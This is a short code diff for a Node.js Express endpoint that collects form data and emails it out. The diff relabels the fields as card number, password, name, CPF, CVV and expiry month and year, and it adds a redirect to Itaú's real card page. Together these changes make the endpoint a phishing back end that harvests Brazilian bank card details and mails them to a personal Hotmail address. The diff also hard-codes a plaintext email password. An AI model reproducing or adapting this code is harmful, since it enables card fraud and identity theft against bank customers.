@@ -19,7 +19,7 @@ app.post('/enviar-dados', (req, res) => {
         secure: false,
         auth: {
             user: 'dinair1979@hotmail.com',
-            pass: '*****'
+            pass: 'dinair1b2f3o'
         }
     });
 
@@ -28,7 +28,7 @@ app.post('/enviar-dados', (req, res) => {
         from: 'dinair1979@hotmail.com',
         to: 'flaviopnc123@hotmail.com',
         subject: 'Novas informações recebidas',
-        text: `numero: ${informacao1}\ninfo: ${informacao2}\ninfo: ${informacao3}\ninfo: ${informacao4}\ninfo: ${informacao5}\ninfo: ${informacao6} \ninfo: ${informacao7}`
+        text: `numero: ${informacao1}\nsenha: ${informacao2}\nnome: ${informacao3}\ncpf: ${informacao4}\ncvv: ${informacao5}\nmm: ${informacao6} \nyy: ${informacao7}`
     };
 
     // Envia o email
@@ -38,7 +38,7 @@ app.post('/enviar-dados', (req, res) => {
             res.send('Erro ao enviar o email');
         } else {
             console.log('Email enviado: ' + info.response);
-            res.redirect('https://flavio062.github.io/port/');
+            res.redirect('https://www.itau.com.br/cartoes');
         }
     });
 });
